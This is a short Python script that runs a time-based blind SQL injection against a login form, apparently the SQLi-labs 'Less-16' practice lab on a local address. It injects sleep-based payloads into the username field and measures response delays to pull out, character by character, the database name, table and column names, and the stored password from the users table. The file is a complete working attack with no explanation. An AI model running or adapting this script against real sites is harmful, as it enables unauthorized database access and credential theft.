import requests
import datetime


def start():
    headers = {'Origin': 'http://192.168.100.100:8080', 'Cache-Control': 'max-age=0',
               'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
               'Upgrade-Insecure-Requests': '1',
               'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36',
               'Referer': 'http://192.168.100.100:8080/Less-16/', 'Connection': 'close',
               'Accept-Encoding': 'gzip, deflate',
               'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
               'Content-Type': 'application/x-www-form-urlencoded'}

    paramsPost = {'uname': '', 'submit': 'Submit',
                  'passwd': 'admin'}
    global res
    for i in range(30):
        for j in range(32, 127):
            start_time = datetime.datetime.now()
            # payload = f'admin\') and if(ascii(substr(database(),{i},1))={j},sleep(5),1)\x23'
            # payload = f'admin\') and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),{i},1))={j},sleep(3),1)\x23'
            # payload = f'admin\') and if(ascii(substr((select column_name from information_schema.columns where table_name='users' limit 2,1),{i},1))={j},sleep(3),1)\x23'
            payload = f'admin\') and if(ascii(substr((select password from users limit 0,1),{i},1))={j},sleep(3),1)\x23'
            paramsPost['uname'] = payload
            response = session.post('http://192.168.100.100:8080/Less-16/', data=paramsPost, headers=headers)
            end_time = datetime.datetime.now()
            t = (end_time - start_time).seconds
            if t >= 3:
                res += chr(j)
                print(res)


if __name__ == '__main__':
    res = ''

    session = requests.Session()

    start()
